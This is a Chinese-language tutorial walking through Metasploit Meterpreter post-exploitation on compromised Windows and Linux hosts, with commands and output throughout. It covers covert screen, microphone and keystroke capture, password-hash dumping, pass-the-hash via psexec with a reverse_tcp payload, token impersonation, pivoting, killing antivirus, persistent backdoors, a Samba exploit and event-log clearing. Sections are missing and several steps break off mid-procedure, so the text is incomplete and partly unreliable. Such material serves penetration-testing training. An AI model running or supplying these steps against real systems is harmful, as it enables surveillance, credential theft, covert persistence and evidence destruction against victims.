Meterpreter是Metasploit框架的一个扩展模块，可以调用Metasploit的一些功能，对目标系统进行更为深入的渗透。这些功能包括反追踪、纯内存工作模式、密码哈希值获取、权限提示、跳板攻击等。本文使用获取到的Meterpreter作为攻击载荷，展示它在进入目标系统后的一些其他攻击方法与技术。

  

**1、捕获控制设备信息**

  

在Meterpreter中，用户可以捕获一些控制设备信息，如目标主机的屏幕、摄像头拍摄到的画面及麦克风的声音等。

  

**（1）捕获屏幕**

  

在Meterpreter Shell中，可以使用screenshot捕获目标主机当前正在显示的屏幕。执行命令如下：

  

meterpreter > screenshot

Screenshot saved to: /opt/metasploit-framework/bin/MHKYhbzu.jpeg

  

从输出的信息中可以看到，捕获的屏幕被保存在/opt/metasploit-framework/bin/MHKYhbzu.jpeg文件中。打开捕获的屏幕文件，效果如图1所示。

![](../Images/f242efcd104d8b4a47d33c22a09ef163.png)

图1  捕获的屏幕

  

**（2）捕获麦克风的声音**

  

在Meterpreter Shell下，可以使用run sound\_recorder命令录制目标主机中麦克风的声音。使用run sound\_recorder命令，默认录制30秒的声音。如果想要录制更长的时间，需要使用-l选项。执行命令如下：

  

meterpreter > run sound\_recorder

\[\*\] Saving recorded audio to /root/.msf4/logs/scripts/sound\_recorder/AA-886OKJM26FSW\_20170507.2547

\[\*\] Recording a total of 0m 30s

\[+\]     Audio saved to: AA-886OKJM26FSW\_1.wav

**2、获取键盘记录**

  

当想要获取目标主机系统的密码时，可以使用破解或攻击的方法，也可以在远程主机上进行键盘记录。在Meterpreter中，可以启动keylog\_recorder模块来获取键盘记录信息。执行命令如下：

  

meterpreter > run post/windows/capture/keylog\_recorder

\[\*\] Executing module against BENET-C8D2KE6J5

\[\*\] Starting the keystroke sniffer...

\[\*\] Keystrokes being saved in to /root/.msf4/loot/20170507173623\_default\_192.168.1.104\_host.windows.key\_429496.txt

\[\*\] Recording keystrokes...

  

此时，表示已经启动了键盘记录。为了验证该操作，可以手动在目标主机上进行一些键盘输入操作，然后在Meterpreter终端使用Ctrl+C键停止键盘记录，即可将所有捕获到的内容保存在一个文件中。按Ctrl+C键后将显示如下信息：

  

^C\[\*\] Saving last few keystrokes...

\[\*\] Interrupt

\[\*\] Stopping keystroke sniffer...

  

从输出的信息中可以看到，已成功保存了键盘记录。键盘记录内容被保存到/root/.msf4/loot/20170507173623\_default\_192.168.1.104\_host.windows.key\_429496.txt文件中。此时，打开一个新的终端，即可查看捕获到的所有内容。具体如下：

  

\[root@RHEL ~\]# cat /root/.msf4/loot/20170507173623\_default\_192.168.1.104\_host.windows.key\_429496.txt

<Ctrl>  <Alt>  <LCtrl>  <LMenu>

<Back>  <Back>  <Back>  <Back>  <Back> bob

123456 <Return>

  

从以上输出的信息中可以看到捕获到的所有内容。

  

除了使用以上捕获键盘记录的方法，也可以使用keyscan\_dump命令来捕获键盘输入。具体操作步骤如下：

  

1）启动键盘输入。执行命令如下：

  

meterpreter > keyscan\_start

Starting the keystroke sniffer...

  

从输出的信息中可以看到，已成功启动了键盘输入。同样，可以在目标主机上进行一些捕获键盘输入的操作。

  

2）捕获键盘输入。执行命令如下：

  

meterpreter > keyscan\_dump

Dumping captured keystrokes...

<LWin> r <Return> net admi <Back>  <Back>  <Back>  <Back> user <Return> net

administrator pass <Left>  <Left>  <Left>  <Left>  <Left>  <Left> user

<Right> word <Return>  <Up>  <Up>  <Return>

  

从以上显示的信息中可以看到，已捕获到目标主机上的所有键盘输入。

  

3）在不需要进行键盘输入捕获时，使用keyscan\_stop命令停止捕获。具体如下：

  

meterpreter > keyscan\_stop

Stopping the keystroke sniffer...

  

从输出的信息中，可以看到已停止了键盘捕获输入。

**3、提升权限**

  

提升权限就是将某个用户原来拥有的较低权限提到较高权限。当用户对目标实施渗透后，可能是一个普通用户，而非管理员。在这种情况下，想要进一步控制该目标主机，就会受到权限影响，不能进行特定类型的攻击。例如，无法提取SAM数据库获得用户和密码哈希值。此时可以使用Meterpreter命令尝试将该用户的权限提升到本地系统权限或管理员权限。

  

用户获取到Meterpreter后，可以使用getuid命令查看获取到的权限等级。具体如下：

  

meterpreter > getuid

Server username: BENET-C8D2KE6J5\\bob

**4、挖掘用户名和密码**

  

如果不使用键盘记录，同样也可以用Meterpreter命令来获取系统本地文件中的用户名和密码哈希值。微软Windows系统存储哈希值的方式一般为LAN Manager（LM）、NT LAN Manager（NTLM）或NT LAN Manager v2（NTLMv2）。在LM存储方式中，当用户首次输入密码或更改密码的时候，密码被转换为哈希值。由于哈希长度的限制，将密码切分为7个字符一组的哈希值。而NTLM的存储方式跟密码长度无关，密码将作为整体转换为哈希值存储。

  

在Meterpreter中，用户可以使用hashdump命令获取系统所有的用户名和密码哈希值。但是获取安全账号管理器（SAM）数据库，需要运行在SYSTEM权限下，以绕过注册表的限制，获取受保护的存有Windows用户和密码的SAM存储。如果获取到的Meterpreter是普通用户权限，用户则需要提升权限，才可以获取到用户的密码哈希值。执行命令如下：

  

meterpreter > run post/windows/gather/hashdump

**5、传递哈希值**

  

在短时间内将明文密码破解出来显然不太可能。如果不知道明文密码，则无法通过该用户账号登录更多的主机，或者入侵更多系统。此时，需要使用哈希值传递技术，仅仅有密码的哈希值就够了，而不需要密码明文。用Metasploit的windows/smb/psexec模块可以实现。

  

使用Metasploit的windows/smb/psexec模块实现哈希值传递。具体操作步骤如下：

  

1）选择windows/smb/psexec模块。执行命令如下：

  

msf5 > use exploit/windows/smb/psexec

msf5 exploit(psexec) >

  

2）选择攻击载荷。执行命令如下：

  

msf5 exploit(psexec) > set payload windows/meterpreter/reverse\_tcp

payload => windows/meterpreter/reverse\_tcp

  

3）配置选项参数。执行命令如下：

  

msf5 exploit(psexec) > set LHOST 192.168.1.105  #设置攻击主机地址

LHOST => 192.168.1.105

msf5 exploit(psexec) > set LPORT 443 #设置端口号

LPORT => 443

msf5 exploit(psexec) > set RHOSTS 192.168.1.104  #设置目标主机地址

RHOST => 192.168.1.104

msf5 exploit(psexec) > set SMBUser Administrator  #指定用户名

SMBUser => Administrator

msf5 exploit(psexec) > set SMBPass 44efce164ab921caaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4  #指定用户的密码哈希值

SMBPass => 44efce164ab921caaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4

  

4）实施渗透攻击。执行命令如下：

  

msf5 exploit(psexec) > exploit

\[\*\] 192.168.1.104:445 - Connecting to the server...

从输出的信息中可以看到认证通过了，并且又获得一个Meterpreter会话。这里没有破解密码，也不需要明文密码，仅使用密码哈希值就获得了管理员权限。

  

如果成功入侵了某大型网络中的一台主机，在多数情况下，这台主机的管理员账号与域中其他大部分系统的账号通用。这样用户就可以无须破解密码，就能够实现从一个节点到另一个节点的攻击。

**7、假冒令牌**

  

使用假冒令牌可以假冒某个网络中的另一个用户进行各种操作，如提升用户权限、创建用户和组等。令牌包括登录会话的安全信息，如用户身份识别、用户组和用户权限。当用户登录Windows系统时，会给他一个访问令牌作为认证会话的一部分。例如，一个入侵用户可能需要以域管理员身份处理一个特定任务，当他使用令牌后，便可假冒域管理员进行工作。当处理完任务时，通常会丢弃该令牌权限。这样，入侵者会利用这个弱点，来提升自己的访问权限。下面介绍在Meterpreter Shell下实现假冒令牌攻击的方法。

  

**（1）工作机制**

  

在假冒令牌攻击中需要使用Kerberos协议。所以在使用假冒令牌前，先来介绍下Kerberos协议。Kerberos是一种网络认证协议，其设计目标是通过密钥系统为客户机/服务器应用程序提供强大的认证服务。Kerberos工作机制如图3所示。

![](../Images/69ddf82e6b708ead2b5d6e021200b103.png)

图3  Kerberos工作机制

  

客户端请求证书的过程如下：

  

1）客户端向认证服务器（AS）发送请求，要求得到服务器的证书。

  

2）AS收到请求后，将包含客户端密钥的加密证书响应发送给客户端。该证书包括服务器ticket（包括服务器密钥加密的客户机身份和一份会话密钥）和一个临时加密密钥（又称为会话密钥session key）。当然，认证服务器会将该证书给服务器也发送一份，用来使服务器认证登录客户端身份。

  

3）客户端将ticket传送到服务器上，服务器确认是该客户端的话，便允许它登录服务器。

  

4）客户端登录成功后，攻击者就可以通过入侵服务器获取客户端的令牌。

**9、通过跳板攻击其他机器**

  

跳板攻击（Pivoting）是Meterpreter提供的一种攻击方法，允许从Meterpreter终端攻击网络中的其他系统。比如，攻击者成功地入侵了一台主机，它就可以任意地利用这台机器作为跳板攻击网络中的其他系统，或者访问由于路由问题而不能直接访问的内网系统。

  

例如，渗透测试者现在从互联网上实施渗透测试，通过某个漏洞（如植入木马或者端口镜像）入侵了一个系统，并在内部网络中取得了Meterpreter终端。但这个系统上没有有意义的信息，然而渗透测试者也不能直接访问其他的内网系统，这时就需要进行内网扩展。跳板攻击允许渗透测试者使用已经取得控制的Meterpreter终端来攻击内部网络中的其他主机。另外，如果是在同一个局域网中的话，渗透测试者可以利用跳板攻击方式来保护自己的身份不被暴露。例如，渗透测试者成功取得了局域网中一台主机的命令行终端（如Windows的PowerShell、Linux的Shell终端），此时渗透测试者即可在该终端上执行任何漏洞扫描或者攻击命令。

  

假设用户通过入侵已经获得了某个服务器的访问权限，接下来就是要与目标网络建立连接。这里可以使用在scripts/meterpreter/目录中的Meterpreter外部脚本来实现。

  

1）成功获取到了Meterpreter会话。具体如下：

  

\[\*\] Meterpreter session 1 opened (192.168.2.10:4444 -> 192.168.1.10:1051)

at 2017-05-07 15:56:24 +0800

meterpreter >

  

从以上会话的地址中，可以看到攻击主机的地址为192.168.2.10，目标主机的地址为192.168.1.10。显然这两台主机不属于同一个网络。所以，如果要对目标主机所在网络中的其他主机进行渗透，则需要添加对应的路由条目才可以实现。

  

2）查看目标系统上的子网。执行命令如下：

  

meterpreter > run get\_local\_subnets

Local subnet: 192.168.1.0/255.255.255.0

  

从输出的信息中可以看到，目标系统所在的子网为192.168.1.0/24。

  

3）将攻击会话放到后台运行，并且添加路由条目。其中，添加路由条目的语法格式如下：

  

route add \[子网\] \[掩码\] \[会话ID\]

  

添加路由条目。执行命令如下：

  

meterpreter > background  #将会话放到后台，其会话ID为1

\[\*\] Backgrounding session 1...

msf5 exploit(handler)> route add 192.168.1.0 255.255.255.0 1 #添加路由条目

\[\*\] Route added

  

从输出的信息中可以看到，已经成功添加了一条路由条目。此时，用户可以使用route print命令查看添加的路由条目。具体如下：

  

msf5 exploit(handler) > route print

Active Routing Table

\====================

Subnet             Netmask         Gateway

\------------------       --------------         ---------------

192.168.1.0        255.255.255.0      Session 1

  

可以看到已成功添加了192.168.1.0/24的路由条目。接下来，攻击主机即可对192.168.1.0/24网络中的其他主机实施渗透。

  

在上面的例子中，是使用route add命令为Meterpreter的攻击会话添加路由。如果要更加自动化地完成这一操作，可以选择使用load auto\_add\_route命令。具体如下：

  

msf5 exploit(handler) > load auto\_add\_route

\[\*\] Successfully loaded plugin: auto\_add\_route

  

**10、使用Meterpreter脚本**

  

Meterpreter的扩展脚本可以在Meterpreter终端里帮助用户进行系统查询，或完成事先定义好的任务。下面介绍几个重要脚本。其中，运行Meterpreter脚本的语法格式如下：

  

run \[脚本名字\]

  

Meterpreter的扩展脚本目前正在移植到后渗透攻击模块中，下面将同时覆盖到扩展脚本和后渗透攻击模块。

  

**（1）迁移进程**

  

当用户攻击系统时，常常对诸如Internet Explorer之类的服务进行漏洞利用，如果目标主机关闭了浏览器，Meterpreter会话也将随之被关闭，从而导致与目标系统的连接丢失。为了避免这个问题，用户可以使用迁移进程的后渗透攻击模块，将Meterpreter会话迁移到内存空间中其他稳定的、不会被关闭的服务进程中，以维持稳定的系统控制连接。执行命令如下：

  

meterpreter > run post/windows/manage/migrate

\[\*\] Running module against BENET-C8D2KE6J5

\[\*\] Current server process: svchost.exe (932)

\[\*\] Spawning notepad.exe process to migrate to

\[+\] Migrating to 1028

\[+\] Successfully migrated to process 1028

  

从以上输出的信息中可以看到，当前的服务进程为svchost.exe（932），自动迁移到notepad.exe（1028）进程。用户也可以直接在Meterpreter中运行migrate命令来实现迁移进程。语法格式如下：

  

migrate \[PID号\]

  

**（2）关闭杀毒软件**

meterpreter > run killav

**11、创建持久后门**

  

当成功获取目标系统的访问权限后，攻击者肯定不希望继续采用同样费力的方式重新获得访问权限。如果目标用户破坏了该连接（如重新启动计算机），此时使用后门可以允许自动与目标系统重新建立连接。为了后续渗透方便，创建一个后门是非常重要的。这样即使连接被中断，也不会影响工作。Metasploit自带的后门有两种启动方式，一种是通过服务启动（metsvc），一种是通过启动项启动（persistence）。下面分别介绍这两种持久后门的创建方法。

  

**使用persistence脚本创建持久后门。具体操作步骤如下：**

  

1）激活Meterpreter会话。执行命令如下：

  

msf5 exploit(handler) > sessions -i 1

\[\*\] Starting interaction with 1...

meterpreter >

  

2）使用run persistence命令创建持久后门。在创建后门之前，先查看该命令的帮助文件。具体如下：

  

meterpreter > run persistence -h

Meterpreter Script for creating a persistent backdoor on a target host.

OPTIONS:-A    Automatically start a matching multi/handler to connect to the agent

\-L <opt>  Location in target host where to write payload to, if none %TEMP% will be used.

\-P <opt>  Payload to use, default is windows/meterpreter/reverse\_tcp.

\-S      Automatically start the agent on boot as a service (with SYSTEM

privileges)

\-T <opt>  Alternate executable template to use

\-U  Automatically start the agent when the User logs on

\-X   Automatically start the agent when the system boots

\-h   This help menu

\-i <opt>   The interval in seconds between each connection attempt

\-p <opt>  The port on the remote host where Metasploit is listening

**12、将命令行Shell升级为Meterpreter**

  

Metasploit框架的一个新功能是可以在系统被攻陷的时候使用sessions-u命令将命令行Shell升级为Meterpreter。如果用户开始时使用命令行Shell进入某系统，后来发现这台主机是进一步攻击整个网络的完美跳板，这时将控制会话升级为Meterpreter就会显得非常有用。

  

以Metasploitable 2系统为目标，利用该主机中的Samba服务漏洞入侵该主机，并且获取到命令行Shell。然后，再将该Shell升级为Meterpreter。具体操作步骤如下：

  

1）使用multi/samba/usermap\_script模块对目标主机的Samba服务实施渗透。执行命令如下：

  

msf5 > use exploit/multi/samba/usermap\_script

msf5 exploit(usermap\_script) >

  

2）查看并配置multi/samba/usermap\_script模块的选项参数。执行命令如下：

  

msf5 exploit(usermap\_script) > show options #查看模块的选项参数

Module options (exploit/multi/samba/usermap\_script):

Name        Current Setting    Required    Description

\-----       ---------------    --------    --------------

RHOSTS  yes  The target address range or CIDR identifier

RPORT    139  yes   The target port (TCP)

Exploit target:

Id  Name

\--  ----

0   Automatic

msf5 exploit(usermap\_script) > set RHOST 192.168.1.106 #指定攻击主机

RHOST => 192.168.1.106

  

该模块有两个可配置选项参数。其中，RPORT已配置，所以在以上过程中配置了RHOST参数。

  

3）使用exploit-z实施渗透攻击。该命令会将成功攻击目标后获取到的会话放在后台运行，暂时不使用控制会话进行交互。具体如下：

  

msf5 exploit(usermap\_script) > exploit -z

\[\*\] Started reverse TCP double handler on 192.168.1.105:4444

\[\*\] Accepted the first client connection...

\[\*\] Accepted the second client connection...

\[\*\] Command: echo N2Q6aPNKvknqaRyd;

\[\*\] Writing to socket A

\[\*\] Writing to socket B

\[\*\] Reading from sockets...

\[\*\] Accepted the first client connection...

\[\*\] Reading from socket B

\[\*\] B: "N2Q6aPNKvknqaRyd\\r\\n"

\[\*\] Matching...

\[\*\] A is input...

\[\*\] Command shell session 1 opened (192.168.1.105:4444 -> 192.168.1.106:46304) at 2017-05-07 17:40:24 +0800

\[\*\] Session 1 created in the background.

msf5 exploit(usermap\_script) >

  

从以上输出信息中可以看到，已成功打开了一个命令行Shell会话1，并且该会话已被放在后台运行。

  

4）使用sessions-u命令将命令行Shell会话1升级为Meterpreter。具体如下：

  

msf5 exploit(usermap\_script) > sessions -u 1

\[\*\] Executing 'post/multi/manage/shell\_to\_meterpreter' on session(s): \[1\]

\[\*\] Upgrading session ID: 1

\[\*\] Starting exploit/multi/handler

\[\*\] Started reverse TCP handler on 192.168.1.105:4433

\[\*\] Starting the payload handler...

\[\*\] Transmitting intermediate stager for over-sized stage...(105 bytes)

\[\*\] Sending stage (1495599 bytes) to 192.168.1.106

从输出的信息中可以看到，在成功升级后，打开了一个Meterpreter会话2。为了确认已成功将命令行Shell会话升级，可以使用sessions命令查看所有的会话。具体如下：

  

msf5 exploit(usermap\_script) > sessions

以上信息表明已成功激活了Meterpreter会话。

  

**13、清除踪迹**

  

当攻击者入侵目标系统后，做的任何操作都可能被记录到目标系统的日志文件中。为了不被目标系统所发现，清除踪迹是非常重要的工作。因为一旦被发现，可能会带来很大的麻烦。现在用户不用担心这个问题了，因为Metasploit提供了一种方法可以很容易地清除所有踪迹。

  

使用Metasploit清除踪迹。具体操作步骤如下：

  

1）激活Meterpreter会话。执行命令如下：

  

msf5 exploit(handler) > sessions -i 1

\[\*\] Starting interaction with 1...

  

2）Metasploit中的irb命令可以清除踪迹。执行命令如下：

  

meterpreter > irb

\[\*\] Starting IRB shell

\[\*\] The 'client' variable holds the meterpreter client

\>>

  

在输出的信息中看到>>提示符，表示成功运行了irb命令。

  

3）设置想要删除的日志。常用的日志选项如下：

  

log=client.sys.eventlog.open（'system'）

log=client.sys.eventlog.open（'security'）

log=client.sys.eventlog.open（'application'）

log=client.sys.eventlog.open（'directory service'）

log=client.sys.eventlog.open（'dns server'）

log=client.sys.eventlog.open（'file replication service'）

  

这里清除所有日志。用户需要一次输入下面所有的日志，具体如下：
